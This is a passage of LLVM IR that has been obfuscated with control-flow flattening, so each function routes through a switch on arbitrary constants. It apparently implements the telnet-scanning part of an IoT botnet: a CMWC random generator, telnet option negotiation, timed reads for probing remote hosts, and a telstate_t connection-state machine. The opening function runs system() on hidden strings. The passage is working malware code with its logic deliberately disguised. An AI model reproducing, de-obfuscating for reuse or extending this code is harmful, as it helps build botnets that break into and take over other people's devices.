  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -21693337, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -21693337, label %10
    i32 254211123, label %14
    i32 1350065310, label %32
    i32 592768117, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 254211123, i32 592768117
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 1350065310, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -21693337, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 689233643, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 689233643, label %first
    i32 432848059, label %30
    i32 -1017622816, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 432848059, i32 -1017622816
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -1017622816, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -189754445, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -189754445, label %8
    i32 1881481676, label %17
    i32 -995266606, label %18
    i32 -286534539, label %19
    i32 -372557781, label %24
    i32 1958385913, label %34
    i32 664868633, label %35
    i32 -108079243, label %36
    i32 -935575287, label %39
    i32 1945698653, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 1881481676, i32 -995266606
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -189754445, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -286534539, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -372557781, i32 -935575287
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 1958385913, i32 664868633
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1945698653, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -108079243, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -286534539, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1945698653, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 1432277327, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1432277327, label %18
    i32 -1173587198, label %27
    i32 295154313, label %44
    i32 -896212843, label %45
    i32 -862048584, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 -1173587198, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 295154313, i32 -896212843
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -862048584, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 -862048584, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1482433926, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1482433926, label %first
    i32 1861505134, label %28
    i32 1219060275, label %32
    i32 206902292, label %38
    i32 -1593076985, label %39
    i32 1814883889, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 1861505134, i32 1219060275
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 1219060275, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 206902292, i32 -1593076985
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 1814883889, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1814883889, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -837432498, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -837432498, label %NodeBlock
    i32 290551971, label %LeafBlock1
    i32 942878023, label %LeafBlock
    i32 -53840848, label %16
    i32 -707605531, label %17
    i32 980565160, label %26
    i32 1842418249, label %27
    i32 2134720987, label %34
    i32 900055308, label %35
    i32 -666624577, label %42
    i32 1090570688, label %50
    i32 1759627759, label %58
    i32 2002691467, label %59
    i32 -1660203247, label %60
    i32 1953533382, label %NewDefault
    i32 -1890977938, label %67
    i32 183976946, label %68
    i32 -135640367, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 942878023, i32 290551971
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -53840848, i32 1953533382
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -707605531, i32 1953533382
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -135640367, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 980565160, i32 1842418249
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -1660203247, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 2134720987, i32 900055308
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 2002691467, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -666624577, i32 1090570688
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 1759627759, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 1759627759, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 2002691467, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1660203247, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 183976946, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1890977938, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 183976946, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -135640367, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -511443730, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -511443730, label %first
    i32 -973627245, label %8
    i32 -2015123229, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 -973627245, i32 -2015123229
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 -2015123229, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1903144860, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1903144860, label %10
    i32 1391485822, label %20
    i32 1816468316, label %23
    i32 -1179400885, label %24
    i32 -2110999757, label %29
    i32 976044113, label %38
    i32 -563782997, label %40
    i32 -1115551952, label %43
    i32 636084276, label %45
    i32 802102150, label %50
    i32 1505840482, label %62
    i32 1566966647, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 1391485822, i32 1816468316
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -1903144860, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -1179400885, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -2110999757, i32 976044113
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #9
  %37 = icmp ne i32 %36, 0
  store i32 976044113, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -563782997, i32 -1115551952
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -1179400885, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 636084276, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 802102150, i32 1566966647
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1505840482, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
